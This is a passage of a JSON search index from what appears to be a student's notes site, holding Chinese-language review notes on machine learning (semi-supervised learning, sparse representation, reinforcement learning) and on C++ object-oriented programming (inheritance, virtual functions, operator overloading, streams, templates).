\u6b63\u5219\u5316\uff1a\u5cad\u56de\u5f52</li> <li>\\(L_1\\) \u6b63\u5219\u5316\uff1aLASSO\uff0c\u66f4\u6613\u4e8e\u83b7\u5f97\u7a00\u758f\u89e3</li> </ul>"},{"location":"cs/ml/review/#_66","title":"\u7a00\u758f\u8868\u793a","text":"<p>\u5c06\u6570\u636e\u96c6\u8003\u8651\u6210\u4e00\u4e2a\u77e9\u9635\uff0c\u6bcf\u884c\u5bf9\u5e94\u4e00\u4e2a\u6837\u672c\uff0c\u6bcf\u5217\u5bf9\u5e94\u4e00\u4e2a\u7279\u5f81\u3002\u8003\u8651\u6bcf\u4e00\u884c\u6709\u5f88\u591a 0 \u5143\u7d20\u3002</p>"},{"location":"cs/ml/review/#_67","title":"\u5b57\u5178\u5b66\u4e60","text":"<p>\u4e3a\u666e\u901a\u7a20\u5bc6\u8868\u8fbe\u7684\u6837\u672c\u627e\u5230\u5408\u9002\u7684\u5b57\u5178\uff0c\u5c06\u6837\u672c\u8f6c\u5316\u4e3a\u7a00\u758f\u8868\u793a\uff0c\u8fd9\u4e00\u8fc7\u7a0b\u79f0\u4e3a\u5b57\u5178\u5b66\u4e60\u3002</p>"},{"location":"cs/ml/review/#_68","title":"\u538b\u7f29\u611f\u77e5","text":"<p>\u5229\u7528\u63a5\u6536\u5230\u7684\u538b\u7f29\u3001\u4e22\u5305\u540e\u7684\u6570\u5b57\u4fe1\u53f7\uff0c\u7cbe\u786e\u91cd\u6784\u51fa\u539f\u4fe1\u53f7\u3002</p>"},{"location":"cs/ml/review/#_69","title":"\u534a\u76d1\u7763\u5b66\u4e60","text":""},{"location":"cs/ml/review/#_70","title":"\u672a\u6807\u8bb0\u6837\u672c","text":"<ul> <li>\u805a\u7c7b\u5047\u8bbe\uff1a\u5047\u8bbe\u6570\u636e\u5b58\u5728\u7c07\u7ed3\u6784\uff0c\u540c\u4e00\u4e2a\u7c07\u7684\u6837\u672c\u5c5e\u4e8e\u540c\u4e00\u4e2a\u7c7b\u522b\u3002</li> <li>\u6d41\u5f62\u5047\u8bbe\uff1a\u5047\u8bbe\u6570\u636e\u5206\u5e03\u5728\u4e00\u4e2a\u6d41\u5f62\u7ed3\u6784\u4e0a\uff0c\u90bb\u8fd1\u7684\u6837\u672c\u62e5\u6709\u76f8\u4f3c\u7684\u8f93\u51fa\u503c\u3002</li> </ul> <p>\u534a\u76d1\u7763\u5b66\u4e60\u5206\u7c7b\uff1a</p> <ul> <li>\u7eaf\u534a\u76d1\u7763\u5b66\u4e60\uff1a\u5047\u5b9a\u8bad\u7ec3\u6570\u636e\u4e2d\u7684\u672a\u6807\u8bb0\u6837\u672c\u5e76\u975e\u5f85\u9884\u6d4b\u7684\u6570\u636e\u3002</li> <li>\u76f4\u63a8\u5b66\u4e60\uff1a\u5047\u5b9a\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u6240\u8003\u8651\u7684\u672a\u6807\u8bb0\u6837\u672c\u6070\u662f\u5f85\u9884\u6d4b\u6570\u636e\uff0c\u5b66\u4e60\u7684\u76ee\u7684\u5c31\u662f\u5728\u8fd9\u4e9b\u672a\u6807\u8bb0\u6837\u672c\u4e0a\u83b7\u5f97\u6700\u4f18\u6cdb\u5316\u6027\u80fd\u3002</li> </ul>"},{"location":"cs/ml/review/#_71","title":"\u751f\u6210\u5f0f\u65b9\u6cd5","text":"<p>\u5047\u8bbe\u6240\u6709\u6570\u636e\uff08\u65e0\u8bba\u662f\u5426\u6807\u8bb0\uff09\u90fd\u662f\u7531\u4e00\u4e2a\u6a21\u578b\u751f\u6210\u7684\u3002\u672a\u6807\u8bb0\u6570\u636e\u7684\u6807\u8bb0\u53ef\u4ee5\u770b\u4f5c\u6a21\u578b\u7684\u53c2\u6570\u3002</p>"},{"location":"cs/ml/review/#svm","title":"\u534a\u76d1\u7763 SVM","text":"<p>\u534a\u76d1\u7763 SVM \uff08S3VM\uff09\uff1a\u627e\u5230\u80fd\u5c06\u4e24\u7c7b\u6709\u6807\u8bb0\u6837\u672c\u5206\u5f00\u4e14\u7a7f\u8fc7\u6570\u636e\u4f4e\u5bc6\u5ea6\u533a\u57df\u7684\u8d85\u5e73\u9762\u3002</p> <p>TSVM \u7b97\u6cd5\uff1a\u8003\u8651\u5bf9\u672a\u6807\u8bb0\u6837\u672c\u8fdb\u884c\u5404\u79cd\u53ef\u80fd\u7684\u6837\u672c\u6307\u6d3e\uff0c\u5bfb\u627e\u4e00\u4e2a\u5728\u6240\u6709\u6837\u672c\u4e0a\u95f4\u9694\u6700\u5927\u5316\u7684\u5212\u5206\u8d85\u5e73\u9762\u3002</p>"},{"location":"cs/ml/review/#_72","title":"\u56fe\u534a\u76d1\u7763\u5b66\u4e60","text":"<p>\u6837\u672c\u5bf9\u5e94\u7ed3\u70b9\uff0c\u8fb9\u7684\u5f3a\u5ea6\u6b63\u6bd4\u4e8e\u6837\u672c\u4e4b\u95f4\u7684\u76f8\u4f3c\u5ea6\u3002</p> <p>\u5c06\u5df2\u6807\u8bb0\u7684\u6837\u672c\u89c6\u4f5c\u67d3\u8fc7\u8272\uff0c\u534a\u76d1\u7763\u5b66\u4e60\u5c31\u5bf9\u5e94\u4e8e\u989c\u8272\u7684\u4f20\u64ad\u3002</p>"},{"location":"cs/ml/review/#_73","title":"\u57fa\u4e8e\u5206\u6b67\u7684\u65b9\u6cd5","text":"<p>\u4f7f\u7528\u591a\u5b66\u4e60\u5668\uff0c\u5229\u7528\u4e0d\u540c\u5b66\u4e60\u5668\u4e4b\u95f4\u7684\u5206\u6b67\u3002</p> <p>\u591a\u89c6\u56fe\u6570\u636e\uff1a\u4e00\u4e2a\u6570\u636e\u5bf9\u8c61\u5f80\u5f80\u540c\u65f6\u62e5\u6709\u591a\u4e2a\"\u5c5e\u6027\u96c6\" (attribute set) \uff0c\u6bcf\u4e2a\u5c5e\u6027\u96c6\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u201c\u89c6\u56fe\u201d(view)\u3002</p> <p>\u8bad\u7ec3\u6b65\u9aa4\uff1a</p> <ul> <li>\u5728\u6bcf\u4e2a\u89c6\u56fe\u4e0a\u57fa\u4e8e\u6709\u6807\u8bb0\u6837\u672c\u5206\u522b\u8bad\u7ec3\u51fa\u4e00\u4e2a\u5206\u7c7b\u5668</li> <li>\u8ba9\u6bcf\u4e2a\u5206\u7c7b\u5668\u5206\u522b\u53bb\u6311\u9009\u81ea\u5df1\"\u6700\u6709\u628a\u63e1\u7684\"\u672a\u6807\u8bb0\u6837\u672c\u8d4b\u4e88\u4f2a\u6807\u8bb0\uff0c\u5e76\u5c06\u4f2a\u6807\u8bb0\u6837\u672c\u63d0\u4f9b\u7ed9\u53e6\u4e00\u4e2a\u5206\u7c7b\u5668\u4f5c\u4e3a\u65b0\u589e\u7684\u6709\u6807\u8bb0\u6837\u672c\u7528\u4e8e\u8bad\u7ec3\u66f4\u65b0</li> <li>\u91cd\u590d\u4e0a\u8ff0\u8fc7\u7a0b\u76f4\u5230\u6536\u655b</li> </ul>"},{"location":"cs/ml/review/#_74","title":"\u534a\u76d1\u7763\u805a\u7c7b","text":"<ul> <li>\u5fc5\u8fde\u7ea6\u675f\uff1a\u4e24\u4e2a\u6837\u672c\u5fc5\u5c5e\u4e8e\u540c\u4e00\u4e2a\u7c07</li> <li>\u52ff\u8fde\u7ea6\u675f\uff1a\u4e24\u4e2a\u6837\u672c\u5fc5\u4e0d\u5c5e\u4e8e\u540c\u4e00\u4e2a\u7c07</li> </ul>"},{"location":"cs/ml/review/#_75","title":"\u6982\u7387\u56fe\u6a21\u578b","text":""},{"location":"cs/ml/review/#_76","title":"\u89c4\u5219\u5b66\u4e60","text":""},{"location":"cs/ml/review/#_77","title":"\u5f3a\u5316\u5b66\u4e60","text":"<p>\u9a6c\u5c14\u53ef\u592b\u51b3\u7b56\u8fc7\u7a0b\uff08Markov Decision Process, MDP\uff09\uff1a\u673a\u5668\u901a\u8fc7\u5728\u73af\u5883\u4e2d\u4e0d\u65ad\u5c1d\u8bd5\u4ece\u800c\u5b66\u5230\u4e00\u4e2a\u7b56\u7565\uff0c\u4f7f\u5f97\u957f\u671f\u6267\u884c\u8be5\u7b56\u7565\u540e\u5f97\u5230\u7684\u7d2f\u79ef\u5956\u8d4f\u6700\u5927\u3002</p> <p>\u6ca1\u6709\u6709\u6807\u8bb0\u6837\u672c\uff0c\u901a\u8fc7\u6267\u884c\u52a8\u4f5c\u4e4b\u540e\u53cd\u9988\u7684\u5956\u8d4f\u6765\u5b66\u4e60\u3002\u5f3a\u5316\u5b66\u4e60\u5728\u67d0\u79cd\u610f\u4e49\u4e0a\u53ef\u4ee5\u8ba4\u4e3a\u662f\u5177\u6709\u201c\u5ef6\u8fdf\u6807\u8bb0\u4fe1\u606f\u201d\u7684\u76d1\u7763\u5b66\u4e60\u3002</p>"},{"location":"cs/oop/","title":"\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u8bbe\u8ba1","text":"<p>Info</p> <p>\u672c\u6587\u6863\u4e3a\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u5b66\u4e60\u7b14\u8bb0\uff0c\u6388\u8bfe\u6559\u5e08\u4e3a \u8bb8\u5a01\u5a01 \u3002</p>"},{"location":"cs/oop/review/","title":"\u671f\u672b\u590d\u4e60","text":""},{"location":"cs/oop/review/#formatting","title":"Formatting","text":"<pre><code>#include &lt;iomanip&gt;\ncout &lt;&lt; d &lt;&lt; \"; \"\n    &lt;&lt; scientific &lt;&lt; d &lt;&lt; \"; \" // 1.23456e+02 style\n    &lt;&lt; hexfloat &lt;&lt; d &lt;&lt; \"; \" // 0x1.23456p+2 style\n    &lt;&lt; fixed &lt;&lt; d &lt;&lt; \"; \" // 123.456000 style\n    &lt;&lt; defaultfloat &lt;&lt; d &lt;&lt; endl; // same as cout &lt;&lt; d &lt;&lt; endl;\n</code></pre> <pre><code>cout.precision(3); // 3 digits after the decimal point\ncout &lt;&lt; d &lt;&lt; endl; // 123.456\n</code></pre>"},{"location":"cs/oop/review/#reference","title":"Reference","text":"<ul> <li>\u5f15\u7528\u4e0d\u80fd\u91cd\u65b0\u7ed1\u5b9a</li> <li>\u4e0d\u80fd\u5f15\u7528\u53f3\u503c</li> <li>\u4e0d\u80fd\u5f15\u7528\u5f15\u7528 <code>int &amp;&amp;</code></li> <li>\u6ca1\u6709\u6307\u5411\u5f15\u7528\u7684\u6307\u9488 <code>int &amp;*p;</code> \uff08\u53ef\u4ee5\u5f15\u7528\u6307\u9488 <code>int *&amp;p;</code>\uff09</li> <li>\u6ca1\u6709\u5f15\u7528\u7684\u6570\u7ec4 <code>int &amp;a[10];</code> \uff08\u53ef\u4ee5\u5f15\u7528\u6570\u7ec4 <code>int (&amp;a)[10];</code>\uff09</li> </ul>"},{"location":"cs/oop/review/#memory-allocation","title":"Memory Allocation","text":"<ul> <li><code>new</code> \u987a\u5e8f\u8c03\u7528\u6784\u9020\u51fd\u6570\uff0c<code>delete</code> \u9006\u5e8f\u8c03\u7528\u6790\u6784\u51fd\u6570</li> <li><code>new</code> \u8fd4\u56de\u5730\u5740\u524d\u7684 <code>size_t</code> \u5b58\u50a8\u4e86\u6570\u7ec4\u7684\u957f\u5ea6</li> </ul>"},{"location":"cs/oop/review/#const","title":"Const","text":"<ul> <li>\u5168\u5c40 <code>const</code> \u53d8\u91cf\u9ed8\u8ba4\u4e3a <code>static</code>\uff0c\u53ea\u5728\u5f53\u524d\u6587\u4ef6\u53ef\u89c1\u3002\u52a0\u4e0a <code>extern</code> \u53ef\u4ee5\u5728\u5176\u4ed6\u6587\u4ef6\u8bbf\u95ee\u3002</li> <li>Runtime Const     <pre><code>const int size1 = 10; // \u7f16\u8bd1\u671f\u5e38\u91cf\nint arr1[size1]; // OK\n</code></pre> <pre><code>int x;\ncin &gt;&gt; x;\nconst int size2 = x; // \u8fd0\u884c\u671f\u5e38\u91cf\nint arr2[size2]; // Error\n</code></pre></li> </ul>"},{"location":"cs/oop/review/#ctor-dtor","title":"Ctor &amp; Dtor","text":"<ul> <li>\u521d\u59cb\u5316\u5217\u8868 <code>: member(value), ... {}</code>\uff0c\u521d\u59cb\u5316\u987a\u5e8f\u4e0e\u58f0\u660e\u987a\u5e8f\u4e00\u81f4</li> <li>const \u6210\u5458\u51fd\u6570\u4e0d\u80fd\u4fee\u6539\u6210\u5458\u53d8\u91cf\uff0c\u4e0d\u80fd\u8c03\u7528\u975e const \u6210\u5458\u51fd\u6570\uff0c\u76f8\u5f53\u4e8e <code>const T * this</code>     const \u5b9e\u4f8b\u4e0d\u80fd\u8c03\u7528\u975e const \u6210\u5458\u51fd\u6570</li> <li>const \u6210\u5458\u53d8\u91cf\u5728\u521d\u59cb\u5316\u5217\u8868\u4e2d\u521d\u59cb\u5316</li> </ul>"},{"location":"cs/oop/review/#inheritance","title":"Inheritance","text":"<ul> <li>\u6d3e\u751f\u7c7b\u6784\u9020\u65f6\uff0c\u5148\u8c03\u7528\u57fa\u7c7b\u6784\u9020\u51fd\u6570\uff0c\u518d\u6839\u636e\u521d\u59cb\u5316\u5217\u8868\u6309\u7167\u58f0\u660e\u987a\u5e8f\u8c03\u7528\u6210\u5458\u6784\u9020\u51fd\u6570\uff0c\u6700\u540e\u8c03\u7528\u6d3e\u751f\u7c7b\u6784\u9020\u51fd\u6570\uff1b\u6790\u6784\u51fd\u6570\u9006\u5e8f</li> <li>\u8c03\u7528\u57fa\u7c7b\u51fd\u6570\uff1a     <pre><code>Derived::Base::func();\n</code></pre>     \u6216\u5728\u6d3e\u751f\u7c7b\u6210\u5458\u51fd\u6570\u4e2d\u8c03\u7528     <pre><code>Base::func();\n</code></pre></li> <li>\u6d3e\u751f\u7c7b\u4e2d\u7684\u540c\u540d\u51fd\u6570\u4f1a\u9690\u85cf\u57fa\u7c7b\u51fd\u6570\uff0c\u8c03\u7528\u65f6\u8981\u4f7f\u7528\u9650\u5b9a\u7b26     <pre><code>Drived d;\nd.Base::func();\n</code></pre></li> <li><code>friend</code> \u58f0\u660e\u53cb\u5143\u51fd\u6570\uff0c\u53ef\u4ee5\u8bbf\u95ee\u7c7b\u7684\u79c1\u6709\u6210\u5458\uff0c\u5728\u7c7b\u5916\u5b9a\u4e49\u65f6\u4e0d\u9700\u8981\u52a0\u9650\u5b9a\u7b26</li> <li> <p>\u7ee7\u627f\u9650\u5b9a\u7b26</p> \u7ee7\u627f\u9650\u5b9a public protected private public public protected \u4e0d\u53ef\u89c1 protected protected protected \u4e0d\u53ef\u89c1 private private private \u4e0d\u53ef\u89c1 </li> </ul>"},{"location":"cs/oop/review/#polymorphism","title":"Polymorphism","text":"<ul> <li><code>virtual</code> \u6839\u636e\u6307\u9488\u6307\u5411\u7684\u5bf9\u8c61\u8c03\u7528\u51fd\u6570\uff1b<code>override</code> \u660e\u786e\u91cd\u5199\u57fa\u7c7b\u51fd\u6570\uff0c\u91cd\u5199\u9700\u8981\u4fdd\u8bc1\u51fd\u6570\u7b7e\u540d\u4e00\u81f4\uff08\u8fd4\u56de\u7c7b\u578b\u5fc5\u987b\u8981\u4e48\u76f8\u540c\uff0c\u8981\u4e48\u4e3a\u534f\u53d8\uff09</li> <li>\u57fa\u7c7b\u6790\u6784\u51fd\u6570\u5e94\u8be5\u58f0\u660e\u4e3a\u865a\u51fd\u6570\uff0c\u5426\u5219\u6790\u6784\u65f6\u4f1a\u8c03\u7528\u57fa\u7c7b\u6790\u6784\u51fd\u6570\u800c\u4e0d\u4f1a\u8c03\u7528\u6d3e\u751f\u7c7b\u6790\u6784\u51fd\u6570</li> <li>\u58f0\u660e <code>virtual</code> \u51fd\u6570\u540e\uff0c\u4f1a\u5728\u7c7b\u4e2d\u751f\u6210\u4e00\u4e2a\u6307\u5411\u865a\u51fd\u6570\u8868\u7684\u6307\u9488\uff0c\u5b58\u653e\u7c7b\u4e2d\u6240\u6709\u865a\u51fd\u6570\u7684\u5730\u5740\u3002\u5f53\u8fdb\u884c\u7ee7\u627f\u65f6\uff0c\u5982\u679c\u6d3e\u751f\u7c7b\u91cd\u5199\u4e86\u57fa\u7c7b\u7684\u865a\u51fd\u6570\uff0c\u4f1a\u5728\u865a\u51fd\u6570\u8868\u4e2d\u5c06\u8be5\u51fd\u6570\u7684\u5730\u5740\u66ff\u6362\u4e3a\u6d3e\u751f\u7c7b\u7684\u51fd\u6570\u5730\u5740\u3002</li> <li>\u6210\u5458\u51fd\u6570\u51fd\u6570\u7b7e\u540d\u5b9e\u9645\u4e0a\u4e3a <code>void foo(ClassName *this, ...)</code></li> <li>\u8fdb\u884c\u8d4b\u503c\u65f6\uff0c\u4e0d\u4f1a\u590d\u5236\u865a\u51fd\u6570\u8868\u6307\u9488     <pre><code>Drived d;\nBase b;\nb = d; // \u8d4b\u503c\u65f6\u4e0d\u4f1a\u590d\u5236\u865a\u51fd\u6570\u8868\u6307\u9488\uff0cb \u4e2d vptr \u4ecd\u6307\u5411 Base \u7684\u865a\u51fd\u6570\u8868\uff0c\u6d3e\u751f\u7c7b\u4e2d\u7684\u6210\u5458\u53d8\u91cf\u88ab\u622a\u65ad\n</code></pre></li> <li>\u5982\u679c\u57fa\u7c7b\u865a\u51fd\u6570\u5b58\u5728\u91cd\u8f7d\uff0c\u90a3\u4e48\u6d3e\u751f\u7c7b\u4e2d\u82e5\u6ca1\u6709\u8bb2\u6240\u6709\u91cd\u8f7d\u51fd\u6570\u90fd\u91cd\u5199\uff0c\u90a3\u4e48\u57fa\u7c7b\u4e2d\u672a\u91cd\u5199\u7684\u51fd\u6570\u4f1a\u88ab\u6d3e\u751f\u7c7b\u9690\u85cf</li> <li>Interface: \u7eaf\u865a\u51fd\u6570\uff0c\u6ca1\u6709\u5b9e\u73b0\uff0c\u6d3e\u751f\u7c7b\u5fc5\u987b\u5b9e\u73b0     <pre><code>class Interface {\npublic:\n    virtual ~Interface() = default;\n    virtual void func(...) = 0;\n    virtual void foo(...) = 0;\n    // ...\n};\n</code></pre></li> </ul>"},{"location":"cs/oop/review/#design","title":"Design","text":"<ul> <li>\u5c06\u786e\u5b9a\u7684\u90e8\u5206\u653e\u5728\u57fa\u7c7b\uff0c\u5c06\u4e0d\u786e\u5b9a\u7684\u90e8\u5206\u653e\u5728\u6d3e\u751f\u7c7b\u8ba9\u6d3e\u751f\u7c7b\u5b9e\u73b0     <pre><code>class Base {\nprivate:\n    int x;\n    // ...\n    virtual void func() = 0; // Implement in Drived\npublic:\n    void run() {\n        // ...\n        func();\n        // ...\n    }\n};\n\nclass Drived : public Base {\nprivate:\n    // ...\n    void func() override {\n        // ...\n    }\n};\n</code></pre></li> <li>Code equality:<ol> <li>Coupling\uff1a\u8026\u5408\u5ea6\uff0c\u6a21\u5757\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\u8981\u5c3d\u91cf\u51cf\u5c11</li> <li>Cohesion\uff1a\u5185\u805a\u5ea6\uff0c\u6a21\u5757\u5185\u90e8\u7684\u529f\u80fd\u8981\u5c3d\u91cf\u72ec\u7acb\uff0c\u4e00\u4e2a\u6a21\u5757\u5c3d\u91cf\u53ea\u505a\u4e00\u4ef6\u4e8b</li> </ol> </li> <li>SOLID Principles:<ol> <li>Single Responsibility Principle\uff1a\u5355\u4e00\u804c\u8d23\u539f\u5219</li> <li>Open-Closed Principle\uff1a\u5f00\u95ed\u539f\u5219\uff0c\u5bf9\u6269\u5c55\u5f00\u653e\uff0c\u5bf9\u4fee\u6539\u5173\u95ed</li> <li>Liskov Substitution Principle\uff1a\u91cc\u6c0f\u66ff\u6362\u539f\u5219\uff0c\u5b50\u7c7b\u53ef\u4ee5\u66ff\u6362\u7236\u7c7b</li> <li>Interface Segregation Principle\uff1a\u63a5\u53e3\u9694\u79bb\u539f\u5219\uff0c\u4f7f\u7528\u591a\u4e2a\u4e13\u95e8\u7684\u63a5\u53e3\u6bd4\u4f7f\u7528\u5355\u4e00\u7684\u603b\u63a5\u53e3\u8981\u597d</li> <li>Dependency Inversion Principle\uff1a\u4f9d\u8d56\u5012\u7f6e\u539f\u5219\uff0c\u9ad8\u5c42\u6a21\u5757\u4e0d\u5e94\u8be5\u4f9d\u8d56\u5e95\u5c42\u6a21\u5757\uff0c\u4e24\u8005\u90fd\u5e94\u8be5\u4f9d\u8d56\u62bd\u8c61</li> </ol> </li> </ul>"},{"location":"cs/oop/review/#copy-constructor","title":"Copy Constructor","text":"<ul> <li>\u62f7\u8d1d\u6784\u9020\u51fd\u6570\uff1a<code>ClassName(const ClassName &amp;obj) {}</code></li> <li>\u9ed8\u8ba4\u62f7\u8d1d\u6784\u9020\u51fd\u6570\uff1a\u9010\u4e2a\u6210\u5458\u53d8\u91cf\u62f7\u8d1d\uff0c\u539f\u751f\u5bf9\u8c61\u9010\u5b57\u8282\u62f7\u8d1d\uff0c\u81ea\u5b9a\u4e49\u5bf9\u8c61\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570</li> <li>\u5728\u51fd\u6570\u4f20\u53c2\uff0c\u51fd\u6570\u8fd4\u56de\uff0c\u521d\u59cb\u5316\u65f6\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570</li> <li>\u7f16\u8bd1\u5668\u4f18\u5316\uff1a\u5982\u679c\u51fd\u6570\u8fd4\u56de\u65f6\uff0c\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u4e34\u65f6\u5bf9\u8c61\uff0c\u7f16\u8bd1\u5668\u4f1a\u4f18\u5316\uff0c\u4e0d\u8c03\u7528\u62f7\u8d1d\u6784\u9020\u51fd\u6570\uff0c\u76f4\u63a5\u8fd4\u56de\u4e34\u65f6\u5bf9\u8c61     <pre><code>ClassName foo() {\n    return ClassName(1);\n}\nClassName obj = foo(); // \u65e0\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u8c03\u7528\n</code></pre></li> </ul>"},{"location":"cs/oop/review/#static","title":"Static","text":"<ul> <li>\u9759\u6001\u5168\u5c40\u53d8\u91cf\uff1a\u53ea\u5728\u5f53\u524d\u6587\u4ef6\u53ef\u89c1</li> <li>\u9759\u6001\u5c40\u90e8\u53d8\u91cf\uff1a\u53ea\u521d\u59cb\u5316\u4e00\u6b21\uff0c\u51fd\u6570\u7ed3\u675f\u540e\u4e0d\u9500\u6bc1</li> <li>\u9759\u6001\u6210\u5458\u53d8\u91cf\uff1a\u6240\u6709\u5bf9\u8c61\u5171\u4eab\uff0c\u4e0d\u5c5e\u4e8e\u5bf9\u8c61\uff0c\u5c5e\u4e8e\u7c7b\uff0c\u5b58\u50a8\u5728\u5168\u5c40\u6570\u636e\u533a\u3002\u9700\u8981\u5728\u7c7b\u5916\u5b9a\u4e49\u3001\u521d\u59cb\u5316\uff0c\u5426\u5219\u5b9e\u4f8b\u5316\u65f6\u4f1a\u94fe\u63a5\u9519\u8bef</li> <li>\u9759\u6001\u6210\u5458\u51fd\u6570\uff1a\u53ea\u80fd\u8bbf\u95ee\u9759\u6001\u6210\u5458\u53d8\u91cf\u548c\u9759\u6001\u6210\u5458\u51fd\u6570     <pre><code>class ClassName {\npublic:\n    static int x;\n    int y;\n    static void func(int z) {\n        cout &lt;&lt; x &lt;&lt; z &lt;&lt; endl;\n        // cout &lt;&lt; y &lt;&lt; endl; // Error\n    }\n};\nint ClassName::x;\n</code></pre></li> <li>\u9759\u6001\u53d8\u91cf\u5728\u7a0b\u5e8f\u7ed3\u675f\u540e\u9500\u6bc1\u3002</li> </ul>"},{"location":"cs/oop/review/#operator-overloading","title":"Operator Overloading","text":"<ul> <li>\u4e0d\u80fd\u91cd\u8f7d\u7684\u8fd0\u7b97\u7b26\uff1a<code>::</code>, <code>.*</code>, <code>.</code>\uff0c<code>?:</code>\uff0c<code>sizeof</code>\uff0c<code>typeid</code>\uff0c<code>const_cast</code>\uff0c<code>dynamic_cast</code>\uff0c<code>reinterpret_cast</code>\uff0c<code>static_cast</code></li> <li>\u91cd\u8f7d\u8fd0\u7b97\u7b26\u5f62\u5f0f\uff1a<ol> <li>\u6210\u5458\u51fd\u6570\uff1a<code>ClassName operator+(const ClassName &amp;obj) {}</code></li> <li>\u5168\u5c40\u51fd\u6570\uff1a<code>ClassName operator+(const ClassName &amp;obj1, const ClassName &amp;obj2) {}</code>\uff0c\u4e00\u822c\u9700\u8981\u58f0\u660e\u4e3a\u53cb\u5143\u51fd\u6570</li> </ol> </li> <li>\u7c7b\u578b\u9650\u5236\uff1a\u8c03\u7528\u65f6\uff0c\u7b2c\u4e00\u4e2a\u64cd\u4f5c\u6570\u4e0d\u80fd\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362     <pre><code>Integer x, y, z;\nz = x + y; // OK\nz = x + 1; // OK\nz = 1 + x; // Error\n</code></pre></li> <li><code>++</code> \u4f7f\u7528 <code>int</code> \u5360\u4f4d     <pre><code>ClassName operator++(int) {} // \u540e\u7f00\nClassName operator++() {} // \u524d\u7f00\n\n// Definition\nClassName&amp; ClassName::operator++() {\n    // ...\n    return *this;\n}\nClassName ClassName::operator++(int) {\n    ClassName tmp = *this;\n    // ...\n    return tmp;\n}\n</code></pre></li> <li>\u7f16\u8bd1\u5668\u4f1a\u751f\u6210\u9ed8\u8ba4\u7684 <code>=</code> \u8fd0\u7b97\u7b26\u91cd\u8f7d\u51fd\u6570\uff0c\u9010\u4e2a\u6210\u5458\u53d8\u91cf\u8d4b\u503c</li> <li> <p>\u81ea\u5b9a\u4e49\u7c7b\u578b\u8f6c\u6362\uff1a</p> <ol> <li>\u7c7b\u578b\u8f6c\u6362\u6784\u9020\u51fd\u6570     <pre><code>class A {\npublic:\n    // ...\n};\nclass B {\npublic:\n    B(const A &amp;a) {}\n};\n</code></pre>     \u8fd9\u91cc <code>B</code> \u53ef\u4ee5\u901a\u8fc7 <code>A</code> \u6784\u9020\uff0c\u53ef\u4ee5\u8fdb\u884c\u4ee5\u4e0b\u8c03\u7528\uff1a     <pre><code>void foo(B b) {}\nA a;\nfoo(a); // OK\uff0c\u9690\u5f0f\u8c03\u7528 B \u7684\u6784\u9020\u51fd\u6570\nB b(a); // OK\uff0c\u663e\u5f0f\u8c03\u7528 B \u7684\u6784\u9020\u51fd\u6570\n</code></pre>     \u5982\u679c\u8981\u7981\u7528\u9690\u5f0f\u8f6c\u6362\uff0c\u53ef\u4ee5\u5728\u6784\u9020\u51fd\u6570\u524d\u52a0 <code>explicit</code> \u5173\u952e\u5b57     <pre><code>class B {\npublic:\n    explicit B(const A &amp;a) {}\n};\nvoid foo(B b) {}\nA a;\nfoo(a); // Error\nB b(a); // OK\n</code></pre></li> <li>\u6216\u8005\u4f7f\u7528 conversion operator     <pre><code>class B {\npublic:\n    B() {}\n};\nclass A {\npublic:\n    operator B() const { // \u4e0d\u5199\u8fd4\u56de\u503c\u7c7b\u578b\uff0c\u8fd4\u56de\u7c7b\u578b\u4e3a B\n        return B();\n    }\n};\n\nvoid foo(B b) {}\nint main() {\n    A a;\n    foo(a); // OK\uff0c\u9690\u5f0f\u8c03\u7528 A \u7684 conversion operator\n    B b0 = a; // OK\uff0c\u9690\u5f0f\u8c03\u7528 A \u7684 conversion operator\n    B b = static_cast&lt;B&gt;(a); // OK\uff0c\u663e\u5f0f\u8c03\u7528 A \u7684 conversion operator\uff0c\u7136\u540e\u8c03\u7528 B \u7684\u6784\u9020\u51fd\u6570\n}\n</code></pre></li> </ol> <p>\u5982\u679c\u4e24\u79cd\u65b9\u6cd5\u90fd\u5b58\u5728\uff0c\u7f16\u8bd1\u5668\u4f1a\u62a5\u9519\u3002\u4e00\u822c\u4f7f\u7528\u81ea\u5b9a\u4e49\u51fd\u6570 <code>to_xxx</code> \u6765\u8fdb\u884c\u7c7b\u578b\u8f6c\u6362\u3002</p> </li> </ul>"},{"location":"cs/oop/review/#streams","title":"Streams","text":"<ul> <li> <p>Stream naming conventions:</p> Input Output Header Generic istream ostream <code>&lt;iostream&gt;</code> File ifstream ofstream <code>&lt;fstream&gt;</code> C String istrstream ostrstream <code>&lt;strstream&gt;</code> C++ String istringstream ostringstream <code>&lt;sstream&gt;</code> </li> <li> <p>Stream extractor:     <pre><code>istream &amp;operator&gt;&gt;(istream &amp;is, T &amp;obj) {\n    // ...\n    return is;\n}\n</code></pre></p> </li> <li>Stream inserter:     <pre><code>ostream &amp;operator&lt;&lt;(ostream &amp;os, const T &amp;obj) {\n    // ...\n    return os;\n}\n</code></pre></li> <li>other output operators:<ul> <li><code>put(char)</code> \u6253\u5370\u5b57\u7b26</li> <li><code>flush()</code> \u5237\u65b0\u7f13\u51b2\u533a\uff0c\u7acb\u5373\u8f93\u51fa</li> </ul> </li> </ul>"},{"location":"cs/oop/review/#templates","title":"Templates","text":"<ul> <li>\u5bfb\u627e\u51fd\u6570\u4f18\u5148\u7ea7\uff1a<ol> <li>\u53c2\u6570\u5217\u8868\u5b8c\u5168\u5339\u914d</li> <li>\u6a21\u7248\u80fd\u5426\u5339\u914d</li> <li>\u80fd\u5426\u901a\u8fc7\u7c7b\u578b\u9690\u5f0f\u8f6c\u6362\u5339\u914d</li> </ol> </li> <li>\u53ef\u4ee5\u663e\u5f0f\u6307\u5b9a\u6a21\u7248\u53c2\u6570\u7c7b\u578b\uff0c\u4e5f\u53ef\u4ee5\u81ea\u52a8\u63a8\u5bfc     <pre><code>template &lt;typename T&gt;\nvoid foo(T t) {}\n\nfoo&lt;int&gt;(1);\nfoo(1); // \u81ea\u52a8\u63a8\u5bfc\n</code></pre></li> <li>\u7ee7\u627f\uff1a<ol> <li>\u4ece\u975e\u6a21\u7248\u7c7b\u7ee7\u627f     <pre><code>template&lt;class T&gt;\nclass Derived : public Base {};\n</code></pre></li> 